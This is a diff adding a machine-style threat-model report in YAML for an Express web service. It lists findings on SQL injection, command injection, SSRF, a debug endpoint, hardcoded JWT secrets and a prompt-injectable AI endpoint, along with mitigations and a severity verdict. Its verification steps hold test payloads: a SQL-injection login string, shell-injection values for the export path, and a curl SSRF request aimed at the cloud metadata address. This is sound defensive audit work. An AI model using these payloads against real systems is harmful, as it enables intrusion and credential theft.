+    middleware and no ownership check against the requesting identity. The query returns the full user row including role,
+    email, and any stored credential hashes for any numeric user ID. An attacker with knowledge of any valid user ID gains
+    read access to all other users' account records, including those with elevated roles.
+  attack_steps: null
+  evidence_summary: server.js:17-18 registers `app.get('/users/:id', async (req, res) => { const user = await db.query(...WHERE
+    id = ${req.params.id}...); res.json(user) })` with no authentication or authorization middleware. The SELECT * query returns
+    all columns. No check compares req.params.id against any authenticated subject.
+  impact_description: Any unauthenticated caller can read the complete database record for any user by iterating numeric IDs.
+    This exposes email addresses, role assignments, and credential data for the entire user table, enabling account takeover
+    and targeted privilege escalation against administrator accounts.
+  likelihood: High
+  impact: High
+  risk: High
+  controls_in_place: None
+  mitigation_title: Add authentication and ownership check to GET /users/:id before returning user records
+  remediation:
+    effort: Low
+    steps:
+    - Add JWT authentication middleware to the /users/:id route; reject unauthenticated requests with HTTP 401.
+    - After authentication, compare req.params.id to the authenticated user's ID from the JWT; return HTTP 403 if they differ
+      unless the caller holds an admin role that explicitly permits cross-user lookup.
+    - 'Replace `SELECT *` with an explicit column list excluding credential hashes and internal fields, and use a parameterized
+      query: `db.query(''SELECT id, email, role FROM users WHERE id = ?'', [req.params.id])`.'
+    code_example: null
+    verification: Send GET /users/1 without credentials and assert HTTP 401. Send GET /users/2 with a valid JWT for user 1
+      and assert HTTP 403. Confirm GET /users/1 with user 1's JWT returns HTTP 200 with no password-hash field in the response
+      body.
+    reference: https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
+  evidence:
+  - file: server.js
+    line: 18
+  boundary_refs:
+  - boundary_id: tb-1
+    origin_component_id: web-api
+    rationale: tb-1 authorization leg assumes every object reference is checked against the authenticated subject before the
+      response is sent; server.js:18 performs no such check.
+    leg: authorization
+    evidence_locations:
+    - file: server.js
+      line: 18
+  violated_requirements:
+  - AC-002
+  - AC-006
+  evidence_check: verified-prior
+  prior_finding_ref: null
+  actor_ids:
+  - ACT-D-01
+  - ACT-D-02
+  primary_actor: ACT-D-01
+  architectural_violation: false
+  component_name: Express Web API
+  source: stride
+  evidence_tier: confirmed-exploitable
+  id: T-011
+  component: web-api
+  mitigation_ids:
+  - M-011
+  _title_source: Missing authorization on user record endpoint (server.js:18)
+  vektor: internet-anon
+- local_id: auth-003
+  threat_category_id: TH-16
+  additional_categories: []
+  stride: Repudiation
+  cwe: CWE-778
+  title: Missing authentication event logging
+  scenario: An attacker conducts a credential-stuffing, token-forgery, or brute-force campaign against /login without generating
+    any authentication log entry; because no success or failure events are recorded in the handler at server.js:11-15, security
+    operations cannot detect the attack, attribute a successful intrusion, or reconstruct which accounts were accessed.
+  attack_steps: null
+  evidence_summary: server.js:11-15 implements the /login handler and issues signed JWTs with no logging statement for success
+    or failure, proving authentication events are unrecorded and cannot support forensic reconstruction or anomaly detection.
+  impact_description: No audit trail for authentication events means successful intrusions cannot be attributed, credential-stuffing
+    campaigns go undetected, and incident response lacks the evidence required to determine scope or timeline.
+  likelihood: High
+  impact: Medium
+  risk: Medium
+  controls_in_place: None — no logging statements are visible in the /login handler or the auth middleware files.
+  mitigation_title: Add structured security event logging to /login handler in server.js
+  remediation:
+    effort: Low
+    steps:
+    - Inside the /login handler at server.js:11, emit a structured JSON log entry on each attempt recording timestamp, masked
+      email, client IP (`req.ip`), and outcome (success or failure reason) using a consistent format per LM-002.
+    - Forward all security events to a centralized log aggregator per LM-003 so events are preserved when the application
+      instance is replaced.
+    - Add partner API key validation failures and tenant resolution errors in the other middleware as additional log points.
+    code_example: null
+    verification: Perform a failed and a successful login attempt, then confirm both appear in the log output with a structured
+      `event` field and masked actor identifier.
+    reference: OWASP Logging Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
+  evidence:
+  - file: server.js
+    line: 11
+  violated_requirements:
+  - LM-001
+  - LM-002
+  evidence_check: verified
+  prior_finding_ref: null
+  architectural_violation: false
+  actor_ids:
+  - ACT-D-01
+  - ACT-D-02
+  primary_actor: ACT-D-01
+  component_name: Authentication & Session Middleware
+  source: stride
+  instances:
+  - file: server.js
+    line: 11
+    severity: Medium
+    local_id: auth-003
+    scenario: An attacker conducts a credential-stuffing, token-forgery, or brute-force campaign against /login without generating
+      any authentication log entry; because no success or failure events are recorded in the handler at server.js:11-15, security
+      operations cannot detect the attack, attribute a successful intrusion, or reconstruct which accounts were accessed.
+    component_id: auth
+    source_ref: auth-003
+  - file: server.js
+    line: 6
+    severity: Medium
+    local_id: web-api-003
+    scenario: The Express application registers no logging middleware and makes no structured log calls in any route handler.
+      Authentication attempts, SQL injection payloads, command injections, and privilege-sensitive operations such as /admin/export
+      produce no security event record. An attacker who exploits any of the injection vulnerabilities leaves no attributable
+      audit trail. Post-incident forensics cannot reconstruct who issued which request, when, or with what payload.
+    component_id: web-api
+    source_ref: web-api-003
+  affected_files:
+  - server.js
+  instance_count: 2
+  consolidated_refs:
+  - auth-003
+  - web-api-003
+  merged_from:
+  - auth
+  - web-api
+  evidence_tier: confirmed-exploitable
+  id: T-012
+  component: auth
+  mitigation_ids:
+  - M-012
+  _title_source: Missing authentication event logging (server.js:11)
+  vektor: internet-anon
+- local_id: auth-005
+  threat_category_id: TH-12
+  additional_categories: []
+  stride: Denial of Service
+  cwe: CWE-918
+  title: Server-side request forgery without URL validation — server.js:30
+  scenario: An attacker POSTs an attacker-controlled URL to /webhooks/preview; server.js:30 passes it directly to fetch()
+    with no validation, timeout, or size limit, allowing the attacker to force the server to make arbitrary HTTP requests,
+    reach internal services including cloud metadata endpoints, or exhaust server threads by targeting slow-responding hosts.
+  attack_steps: null
+  evidence_summary: server.js:30 passes `req.body.url` directly to `fetch()` without URL scheme or hostname validation, and
+    applies no AbortSignal timeout or response-body size limit, proving attacker-controlled external network requests execute
+    unbounded from server context.
+  impact_description: An attacker can enumerate internal services on the VPC or container network, access cloud metadata credentials
+    (e.g., AWS IMDSv1 at 169.254.169.254), or exhaust server connection threads and memory through deliberately slow or large
+    responses, degrading availability for legitimate users.
+  likelihood: Medium
+  impact: Medium
+  risk: Medium
+  controls_in_place: None — no URL allowlist, scheme restriction, timeout, or authentication is applied to /webhooks/preview.
+  mitigation_title: Validate and bound outbound URL in /webhooks/preview handler in server.js
+  remediation:
+    effort: Medium
+    steps:
+    - Before calling `fetch()` at server.js:30, parse `req.body.url` with `new URL()`, reject any hostname not in an explicit
+      allowlist, and block private, loopback, link-local, and metadata address ranges (per IV-007).
+    - 'Pass `{ signal: AbortSignal.timeout(5000) }` to `fetch()` and limit the response body read to a documented byte cap
+      (e.g., `res.arrayBuffer()` with a size check) to prevent thread exhaustion.'
+    - Apply partner authentication middleware to `/webhooks/preview` so only authorized callers can trigger outbound fetches.
+    code_example: "// server.js:30 — validate URL before fetch\nconst ALLOWED_HOSTS = new Set(['hooks.example.com'])\nconst\
+      \ parsed = new URL(req.body.url)\nif (!ALLOWED_HOSTS.has(parsed.hostname))\n  return res.status(400).json({ error: 'Disallowed\
+      \ URL' })\nconst response = await fetch(req.body.url, { signal: AbortSignal.timeout(5000) })"
+    verification: '`curl -s -o /dev/null -w ''%{http_code}'' -X POST http://localhost:3000/webhooks/preview -H ''Content-Type:
+      application/json'' -d ''{"url":"http://169.254.169.254/latest/meta-data/"}'' ` must return 400 after the fix.'
+    reference: OWASP Server-Side Request Forgery Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+  evidence:
+  - file: server.js
+    line: 30
+  violated_requirements:
+  - IV-007
+  - IV-006
+  evidence_check: verified
+  prior_finding_ref: null
+  architectural_violation: false
+  actor_ids:
+  - ACT-D-01
+  - ACT-D-07
+  primary_actor: ACT-D-01
+  component_name: Authentication & Session Middleware
+  source: stride
+  evidence_tier: confirmed-exploitable
+  id: T-013
+  component: auth
+  mitigation_ids:
+  - M-013
+  _title_source: Server-side request forgery without URL validation (server.js:30)
+  vektor: internet-anon
+mitigations:
+- id: M-001
+  title: Use parameterized database queries
+  kind: fix
+  priority: P1
+  severity: Critical
+  effort: Low
+  threat_ids:
+  - T-001
+  auto_emitted: true
+  auto_source: finding-fix
+  prevents:
+  - CWE-89
+  _title_source: Replace string-interpolated SQL with parameterized queries in login handler
+  steps:
+  - 'Replace the template-literal SQL string at server.js:12 with a parameterized query: `db.query(''SELECT id, role FROM
+    users WHERE email = ? AND password = ?'', [req.body.email, req.body.password])`.'
+  - Add input validation middleware (e.g., express-validator) to enforce type, length, and format on email and password fields
+    before they reach any database call.
+  - Write an integration test that submits `' OR '1'='1' --` as the email and asserts HTTP 401 with no JWT in the response.
+  verification: Send POST /login with body {"email":"' OR '1'='1' --","password":"x"}; the response MUST be HTTP 401 with
+    no token field. A 200 response with a JWT indicates the injection is still exploitable.
+  reference: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+  file: server.js:12
+- id: M-002
+  title: Enforce authentication and shell-safe invocation on /admin/export
+  kind: fix
+  priority: P1
+  severity: Critical
+  effort: Medium
+  threat_ids:
+  - T-002
+  auto_emitted: true
+  auto_source: finding-fix
+  prevents:
+  - CWE-78
+  _title_source: Enforce authentication and shell-safe invocation on /admin/export in server.js
+  steps:
+  - Apply authentication middleware to `/admin/export` before any other change so unauthenticated callers receive 401.
+  - 'Replace `exec()` at server.js:23 with a shell-free spawn: resolve `req.body.path` using `path.resolve()`, confirm it
+    falls within the permitted export base directory, then call `spawn(''tar'', [''-czf'', ''/tmp/export.tgz'', validatedPath],
+    {shell: false})` — the array form of spawn never passes arguments through a shell.'
+  - Add an integration test that submits `"; id"` as path and asserts a 400 or 403 response with no command output.
+  verification: 'Send `curl -s -X POST http://localhost:3000/admin/export -H ''Content-Type: application/json'' -d ''{"path":".
+    && echo INJECTED"}'' | grep INJECTED` — output must be empty after the fix.'
+  reference: OWASP Command Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  file: server.js:23
+- id: M-003
+  title: Use parameterized database queries
+  kind: fix
+  priority: P1
+  severity: Critical
+  effort: Medium
+  threat_ids:
+  - T-003
+  auto_emitted: true
+  auto_source: finding-fix
+  how: Use parameterized / bound queries (placeholders + a values array, or an ORM's safe query builder); never interpolate
+    request data into the SQL string.
+  prevents:
+  - CWE-89
+  _title_source: Use parameterized / bound queries (placeholders + a values array, or an ORM's safe query builder); never
+    interpolate request data into the SQL string.
+  steps:
+  - Use parameterized / bound queries (placeholders + a values array, or an ORM's safe query builder); never interpolate request
+    data into the SQL string.
+  - Add a regression test (or CI check) that fails on the vulnerable pattern and passes once the fix is in place.
+  verification: Re-run the INJ-001 scanner check; it reports no match at server.js:12, and the regression test passes.
+  file: server.js:12
+- id: M-004
+  title: Remove the /debug/environment endpoint and source-managed JWT secret from production
+  kind: fix
+  priority: P1
+  severity: Critical
+  effort: Low
+  threat_ids:
+  - T-004
+  auto_emitted: true
+  auto_source: finding-fix
+  prevents:
+  - CWE-215
+  _title_source: Remove the /debug/environment endpoint and source-managed JWT secret from production
+  steps:
+  - Remove the `app.get('/debug/environment', ...)` route from server.js entirely; if a health or diagnostic endpoint is operationally
+    required, replace it with a minimal authenticated endpoint that returns only non-sensitive status fields.
+  - Remove the hardcoded `const secret = '**** (29 chars)'` from server.js and inject the JWT secret exclusively from a managed
+    secret store (e.g., an environment variable loaded from Vault or AWS Secrets Manager at startup), never committed to source.
+  - Write a test asserting that GET /debug/environment returns HTTP 404 (or 401 if the route is retained in a restricted form)
+    in the production configuration.
+  verification: Send GET /debug/environment without credentials and assert HTTP 404 or 401; a 200 response containing process.env
+    keys is the fail condition. Confirm the JWT secret is absent from the server.js source via `grep -r 'jwt-secret' .`.
+  reference: https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration
+  file: server.js:41
+- id: M-005
+  title: Move cryptographic keys to a managed secret store
+  kind: fix
+  priority: P2
+  severity: High
+  effort: Low
+  threat_ids:
+  - T-005
+  auto_emitted: true
+  auto_source: finding-fix
+  prevents:
+  - CWE-321
+  _title_source: Replace hardcoded JWT signing secret with runtime-injected environment variable in server.js
+  steps:
+  - Remove the literal `const secret = '**** (29 chars)'` at server.js:9 and replace with `const secret = process.env.JWT_SECRET;
+    if (!secret) throw new Error('JWT_SECRET is required');` so the application fails closed at startup when the variable
+    is absent.
+  - Provision JWT_SECRET through a managed secret store (e.g., Kubernetes Secret or HashiCorp Vault mounted as an environment
+    variable); never commit the value to version control.
+  - Rotate the currently exposed constant immediately and revoke or re-issue all tokens signed with it.
+  - Add a CI check that searches for string-literal JWT secrets using a pattern such as `grep -r 'jwt.*secret.*=.*["\x27][a-zA-Z0-9]'
+    .` and fails the build on a match.
+  code_example: '// server.js:9 — replace hardcoded constant
+
+    const secret = process.env.JWT_SECRET
+
+    if (!secret) throw new Error(''JWT_SECRET environment variable is required'')'
+  verification: Start the application without JWT_SECRET set and confirm it exits with a startup error; then set a test secret,
+    issue a token, modify one byte of the signature, and assert the server returns 401.
+  reference: 'CWE-321: Use of Hard-coded Cryptographic Key — https://cwe.mitre.org/data/definitions/321.html'
+  file: server.js:9
+- id: M-006
+  title: Stop exposing internal information to clients
+  kind: fix
+  priority: P2
+  severity: High
+  effort: Low
+  threat_ids:
+  - T-006
+  auto_emitted: true
+  auto_source: finding-fix
+  prevents:
+  - CWE-200
+  _title_source: Remove or gate /debug/environment route behind production check in server.js
+  steps:
+  - Remove the `/debug/environment` route at server.js:41 entirely from the production build; if a non-production debug facility
+    is needed, gate it with `if (process.env.NODE_ENV !== 'production')` and apply admin authentication.
+  - Add a smoke test in CI that sends GET /debug/environment to the production build and asserts an HTTP 404 response.
+  - Audit all other routes for unauthenticated environment or configuration disclosure and apply the same removal pattern.
+  verification: '`curl -s -o /dev/null -w ''%{http_code}'' http://localhost:3000/debug/environment` must return 404 in the
+    production build.'
+  reference: OWASP Testing for Debug Parameters (OTG-CONFIG-007) — https://owasp.org/www-project-web-security-testing-guide/
+  file: server.js:41
+- id: M-007
+  title: Validate and allowlist outbound request targets
+  kind: fix
+  priority: P2
+  severity: High
+  effort: Medium
+  threat_ids:
+  - T-007
+  auto_emitted: true
+  auto_source: finding-fix
+  how: Validate the URL against a strict allowlist of hosts/schemes, resolve and block private/link-local ranges, and disable
+    redirects to internal targets.
+  prevents:
+  - CWE-918
+  _title_source: Validate the URL against a strict allowlist of hosts/schemes, resolve and block private/link-local ranges,
+    and disable redirects to internal targets.
+  steps:
+  - Validate the URL against a strict allowlist of hosts/schemes, resolve and block private/link-local ranges, and disable
+    redirects to internal targets.
+  - Add a regression test (or CI check) that fails on the vulnerable pattern and passes once the fix is in place.
+  verification: Re-run the INJ-003 scanner check; it reports no match at server.js:30, and the regression test passes.
+  file: server.js:30
+- id: M-008
+  title: Rate-limit and lock out repeated authentication attempts
+  kind: fix
+  priority: P2
+  severity: High
+  effort: Medium
+  threat_ids:
+  - T-008
+  auto_emitted: true
+  auto_source: finding-fix
+  prevents:
+  - CWE-770
+  _title_source: Add authentication, rate limiting, and max_tokens bound to the /assistant endpoint
+  steps:
+  - Add JWT authentication middleware to the /assistant route before the handler so unauthenticated requests receive HTTP
+    401.
+  - Apply a per-authenticated-user rate limit (e.g., express-rate-limit at 10 requests/minute) and a maximum request body
+    size of 8 kB for the prompt field.
+  - 'Pass `maxTokens: 512` (or org-configured value) to the ChatOpenAI constructor to cap per-request token consumption, and
+    set a request-level timeout.'
+  verification: Send 20 POST /assistant requests without credentials within 10 seconds; all 20 must return HTTP 401. With
+    valid credentials, confirm the 11th request within a minute returns HTTP 429.
+  reference: https://genai.owasp.org/llmrisk/llm10-unbounded-consumption/
+  file: server.js:36
+- id: M-009
+  title: Apply least-privilege filesystem access
+  kind: fix
+  priority: P2
+  severity: High
+  effort: Medium
+  threat_ids:
+  - T-009
+  auto_emitted: true
+  auto_source: finding-fix
+  prevents:
+  - CWE-284
+  _title_source: Cross-check x-tenant-id against authenticated JWT tenant claim in tenantContext.js
+  steps:
+  - 'In middleware/tenantContext.js after line 2, add a guard: if `req.user` (the decoded JWT payload) is present and its
+    `tenant_id` claim does not equal the supplied `tenantId`, return 403 with `{error: ''Tenant mismatch''}` — this enforces
+    that the header can only confirm, not override, the authenticated tenant.'
+  - Ensure JWT verification middleware executes before tenantContext middleware on every route that uses req.tenantContext,
+    so req.user is always populated when the check runs.
+  - Add an integration test that issues a JWT for tenant A, sends x-tenant-id as tenant B, and asserts the response is 403.
+  code_example: "// middleware/tenantContext.js — cross-check header against JWT claim\nmodule.exports = (req, res, next)\
+    \ => {\n  const tenantId = req.headers['x-tenant-id']\n  if (!tenantId) return res.status(400).json({ error: 'Missing\
+    \ tenant' })\n  if (req.user?.tenant_id && req.user.tenant_id !== tenantId)\n    return res.status(403).json({ error:\
+    \ 'Tenant mismatch' })\n  req.tenantContext = { tenant_id: tenantId }\n  next()\n}"
+  verification: 'Issue a JWT for tenant-A, send it with `x-tenant-id: tenant-B` against any tenant-scoped endpoint, and confirm
+    the response is HTTP 403 with no tenant-B data in the body.'
+  reference: 'CWE-284: Improper Access Control — https://cwe.mitre.org/data/definitions/284.html'
+  file: middleware/tenantContext.js:2
+- id: M-010
+  title: Enforce server-side authorization on every endpoint
+  kind: fix
+  priority: P2
+  severity: High
+  effort: Medium
+  threat_ids:
+  - T-010
+  auto_emitted: true
+  auto_source: finding-fix
+  how: Add an explicit auth middleware (isAuthorized() / passport.authenticate() / requireAuth) to the route registration,
+    or mark the route intentionally public via app.get(...) for read-only access only.
+  prevents:
+  - CWE-862
+  _title_source: Add an explicit auth middleware (isAuthorized() / passport.authenticate() / requireAuth) to the route registration,
+    or mark the route intentionally public via app.get(...) for read-only access only.
+  steps:
+  - Add an explicit auth middleware (isAuthorized() / passport.authenticate() / requireAuth) to the route registration, or
+    mark the route intentionally public via app.get(...) for read-only access only.
+  - Add a regression test (or CI check) that fails on the vulnerable pattern and passes once the fix is in place.
+  verification: Re-run the AUTHZ-008 scanner check; it reports no match at server.js:22, and the regression test passes.
+  file: server.js:22
+- id: M-011
+  title: Enforce server-side authorization on every endpoint
+  kind: fix
+  priority: P2
+  severity: High
+  effort: Low
+  threat_ids:
+  - T-011
+  auto_emitted: true
+  auto_source: finding-fix
+  prevents:
+  - CWE-862
+  _title_source: Add authentication and ownership check to GET /users/:id before returning user records
+  steps:
+  - Add JWT authentication middleware to the /users/:id route; reject unauthenticated requests with HTTP 401.
+  - After authentication, compare req.params.id to the authenticated user's ID from the JWT; return HTTP 403 if they differ
+    unless the caller holds an admin role that explicitly permits cross-user lookup.
+  - 'Replace `SELECT *` with an explicit column list excluding credential hashes and internal fields, and use a parameterized
+    query: `db.query(''SELECT id, email, role FROM users WHERE id = ?'', [req.params.id])`.'
+  verification: Send GET /users/1 without credentials and assert HTTP 401. Send GET /users/2 with a valid JWT for user 1 and
+    assert HTTP 403. Confirm GET /users/1 with user 1's JWT returns HTTP 200 with no password-hash field in the response body.
+  reference: https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
+  file: server.js:18
+- id: M-012
+  title: Add security audit logging
+  kind: fix
+  priority: P3
+  severity: Medium
+  effort: Low
+  threat_ids:
+  - T-012
+  auto_emitted: true
+  auto_source: finding-fix
+  prevents:
+  - CWE-778
+  _title_source: Add structured security event logging to /login handler in server.js
+  steps:
+  - Inside the /login handler at server.js:11, emit a structured JSON log entry on each attempt recording timestamp, masked
+    email, client IP (`req.ip`), and outcome (success or failure reason) using a consistent format per LM-002.
+  - Forward all security events to a centralized log aggregator per LM-003 so events are preserved when the application instance
+    is replaced.
+  - Add partner API key validation failures and tenant resolution errors in the other middleware as additional log points.
+  verification: Perform a failed and a successful login attempt, then confirm both appear in the log output with a structured
+    `event` field and masked actor identifier.
+  reference: OWASP Logging Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
+  file: server.js:11
+- id: M-013
+  title: Validate and allowlist outbound request targets
+  kind: fix
+  priority: P3
+  severity: Medium
+  effort: Medium
+  threat_ids:
+  - T-013
+  auto_emitted: true
+  auto_source: finding-fix
+  prevents:
+  - CWE-918
+  _title_source: Validate and bound outbound URL in /webhooks/preview handler in server.js
+  steps:
+  - Before calling `fetch()` at server.js:30, parse `req.body.url` with `new URL()`, reject any hostname not in an explicit
+    allowlist, and block private, loopback, link-local, and metadata address ranges (per IV-007).
+  - 'Pass `{ signal: AbortSignal.timeout(5000) }` to `fetch()` and limit the response body read to a documented byte cap (e.g.,
+    `res.arrayBuffer()` with a size check) to prevent thread exhaustion.'
+  - Apply partner authentication middleware to `/webhooks/preview` so only authorized callers can trigger outbound fetches.
+  code_example: "// server.js:30 — validate URL before fetch\nconst ALLOWED_HOSTS = new Set(['hooks.example.com'])\nconst\
+    \ parsed = new URL(req.body.url)\nif (!ALLOWED_HOSTS.has(parsed.hostname))\n  return res.status(400).json({ error: 'Disallowed\
+    \ URL' })\nconst response = await fetch(req.body.url, { signal: AbortSignal.timeout(5000) })"
+  verification: '`curl -s -o /dev/null -w ''%{http_code}'' -X POST http://localhost:3000/webhooks/preview -H ''Content-Type:
+    application/json'' -d ''{"url":"http://169.254.169.254/latest/meta-data/"}'' ` must return 400 after the fix.'
+  reference: OWASP Server-Side Request Forgery Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+  file: server.js:30
+critical_findings:
+- threat_id: T-001
+  summary: SQL Injection authentication bypass (server.js:12)
+  mitigation_id: M-001
+- threat_id: T-002
+  summary: OS command injection via exec in /admin/export (server.js:23)
+  mitigation_id: M-002
+- threat_id: T-003
+  summary: SQL injection request data interpolated into a SQL string server.js:12
+  mitigation_id: M-003
+- threat_id: T-004
+  summary: Unauthenticated debug environment endpoint (server.js:41)
+  mitigation_id: M-004
+- threat_id: T-005
+  summary: Hardcoded JWT signing key (server.js:9)
+  mitigation_id: M-005
+- threat_id: T-006
+  summary: Unauthenticated debug endpoint exposes all environment secrets (server.js:41)
+  mitigation_id: M-006
+- threat_id: T-007
+  summary: SSRF outbound request to a request-controlled URL server.js:30
+  mitigation_id: M-007
+- threat_id: T-008
+  summary: Unbounded LLM consumption without auth or rate limit (server.js:36)
+  mitigation_id: M-008
+- threat_id: T-009
+  summary: Unvalidated tenant header overrides authenticated identity (tenantContext.js:2)
+  mitigation_id: M-009
+- threat_id: T-010
+  summary: Sensitive REST route registered without authentication middleware server.js:22
+  mitigation_id: M-010
+- threat_id: T-011
+  summary: Missing authorization on user record endpoint (server.js:18)
+  mitigation_id: M-011
+actors:
+- id: ACT-D-01
+  label: anonymous-internet-attacker
+  access:
+  - internet
+  - dmz
+  trust_positions:
+  - public-endpoint-reach
+  heatmap_slug: internet-anon
+  active: true
+  origin: plugin
+- id: ACT-D-02
+  label: authenticated-low-priv-user
+  access:
+  - internet
+  - authenticated-user-session
+  trust_positions:
+  - authenticated-user-authority
+  heatmap_slug: internet-user
+  active: true
+  origin: plugin
+- id: ACT-D-03
+  label: authenticated-high-priv-user
+  access:
+  - internet
+  - authenticated-user-session
+  - authenticated-admin-session
+  trust_positions:
+  - privileged-user-authority
+  heatmap_slug: internet-priv-user
+  active: true
+  origin: plugin
+- id: ACT-D-06
+  label: supply-chain-attacker
+  access:
+  - build-pipeline
+  - ci-cd-runtime
+  - internet
+  trust_positions:
+  - software-supply-chain-control
+  heatmap_slug: build-time
+  active: true
+  origin: plugin
+- id: ACT-D-07
+  label: compromised-third-party-service
+  access:
+  - internet
+  - peer-service
+  trust_positions:
+  - trusted-service-control
+  heatmap_slug: internet-anon
+  active: true
+  origin: plugin
+tier_root_causes:
+  server:
+  - Raw request data interpolated into SQL and shell command execution strings
+  - Routes registered without authentication middleware expose privileged operations
+  - Attacker-controlled URLs accepted without scheme/host validation or allowlisting
+  - Secrets committed to source and exposed through unauthenticated debug endpoints
+  - Tenant identity derived from an unvalidated request header instead of JWT claims
+cross_repo_dependencies: []
+weaknesses:
+- id: W-001
+  weakness_class: injection
+  kind: design
+  title: Database access relies on concatenated queries
+  statement: Parameterized Database Access is not consistently enforced.
+  severity: Critical
+  severity_basis: confirmed
+  observable_backing:
+    absent_control_signal:
+    - Parameterized Queries
+    - ORM / Repository Layer
+    - file: server.js
+      line: 12
+      signal: const sql = `SELECT id, role FROM users WHERE email = '${req.body.email}' AND password = '${req.body.password}'`
+    - file: server.js
+      line: 18
+      signal: const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`)
+    - file: server.js
+      line: 23
+      signal: exec(`tar -czf /tmp/export.tgz ${req.body.path}`, (error) => {
+    - file: server.js
+      line: 36
+      signal: 'const answer = await model.invoke(`Follow the user''s instructions exactly: ${req.body.prompt}`)'
+    practice_evidence:
+    - file: server.js
+      line: 18
+  mechanism_id: database-query-concatenation
+  affected_components:
+  - web-api
+  implementation_strategy: standard-misused
+  instances:
+  - id: T-001
+    file: server.js
+    line: 12
+    basis: confirmed-exploitable
+  - id: T-003
+    file: server.js
+    line: 12
+    basis: confirmed-exploitable
+  description: Database queries are assembled from application values instead of passing those values through an enforced
+    parameterised data-access path. This leaves every call site responsible for preserving query structure.
+  structural_recommendation: provide one parameterised repository or query-builder path and prohibit application-value interpolation
+    in database queries
+- id: W-002
+  weakness_class: broken_auth
+  kind: design
+  title: Endpoints are reachable without enforced authentication
+  statement: Route Authentication is not consistently enforced.
+  severity: Medium
+  severity_basis: design-risk
+  observable_backing:
+    absent_control_signal:
+    - Route Authentication Middleware
+    - Server-Side Session Enforcement
+    - file: server.js
+      line: 22
+      signal: POST /admin/export authn=unknown authz=unknown
+    - file: server.js
+      line: 34
+      signal: POST /assistant authn=unknown authz=unknown
+    - file: server.js
+      line: 41
+      signal: GET /debug/environment authn=unknown authz=unknown
+  mechanism_id: missing-endpoint-authentication
+  description: Sensitive API routes and real-time channels are exposed without an enforced authentication check at the endpoint
+    boundary. Access control depends on each handler (or the caller) remembering to require a session, so an unauthenticated
+    client can reach privileged operations directly.
+  structural_recommendation: enforce authentication centrally at the routing and channel boundary so every exposed endpoint
+    requires a verified session unless explicitly marked public
+- id: W-003
+  weakness_class: injection
+  kind: design
+  title: Input handling lacks enforced boundary validation
+  statement: Schema / Allowlist Input Validation is not consistently enforced.
+  severity: Medium
+  severity_basis: design-risk
+  observable_backing:
+    absent_control_signal:
+    - Schema Validation
+    - Allowlist Validation
+  mechanism_id: blacklist-only-input-validation
+  description: Request handlers do not validate input against one enforced server-side schema or allowlist at the boundary
+    — validation is either absent on the vulnerable parameters or limited to rejecting selected bad patterns (a blacklist).
+    New encodings and unanticipated input forms can therefore reach downstream parsers or interpreters.
+  structural_recommendation: enforce server-side schemas and domain-specific allowlists before input reaches parsing, persistence,
+    or command construction
+- id: W-004
+  weakness_class: outdated_deps
+  kind: design
+  title: Build pipeline trusts mutable third-party references
+  statement: Third-Party Action Pinning is not consistently enforced.
+  severity: Medium
+  severity_basis: design-risk
+  observable_backing:
+    absent_control_signal:
+    - Commit-SHA Action Pinning
+    - Dependency Provenance Verification
+  mechanism_id: build-pipeline-mutable-refs
+  description: CI/CD workflows resolve third-party actions and other build dependencies to mutable tags or branches instead
+    of immutable commit digests, so a retagged or compromised upstream runs inside the pipeline with its token and secret
+    scope.
+  structural_recommendation: pin every third-party action and build dependency to an immutable commit SHA (or a vetted internal
+    mirror) and enforce SHA-pinning in CI
+verdict:
+  severity: red
+  opening: 'This application has no access controls that work: any caller from the internet can take over any user account,
+    run arbitrary commands on the server, or read every secret the service depends on — without supplying any credential.
+    The service must not be publicly reachable in its current state.'
+  bullets:
+  - title: Authentication bypassed at login
+    body: Database query injection (SQL injection) at the login handler grants any caller a signed admin session without a
+      password.
+    findings:
+    - F-001
+    - F-003
+    weaknesses:
+    - W-001
+    verified_attack_path: false
+  - title: Server takeover via admin route
+    body: Command string injection (OS command injection) on an unauthenticated admin route lets any caller run arbitrary
+      system commands.
+    findings:
+    - F-002
+    weaknesses: []
+    verified_attack_path: false
+  - title: All runtime secrets exposed
+    body: An unauthenticated debug route returns all runtime configuration as plain text, disclosing every credential and
+      signing secret used by the application.
+    findings:
+    - F-004
+    - F-006
+    weaknesses: []
+    verified_attack_path: false
+  - title: Account access freely forgeable
+    body: The session signing key is committed in source code so any reader with repository access can issue tokens for any
+      user identity.
+    findings:
+    - F-005
+    weaknesses: []
+    verified_attack_path: false
+  - title: Customer account data exposed
+    body: User records are readable without authentication, exposing account details and role assignments for any enumerated
+      identifier.
+    findings:
+    - F-011
+    - F-010
+    weaknesses: []
+    verified_attack_path: false
+  - title: AI assistant open to cost abuse
+    body: The AI assistant accepts unauthenticated requests with no rate limit, enabling cost exhaustion and prompt manipulation
+      against the integrated language model.
+    findings:
+    - F-008
+    weaknesses: []
+    verified_attack_path: false
+  closing: Adding authentication to every public route and removing all hardcoded secrets would close the most critical risks;
+    the remaining gaps follow from those two absent controls.
+  bullets_intro: 'What an attacker can do today:'
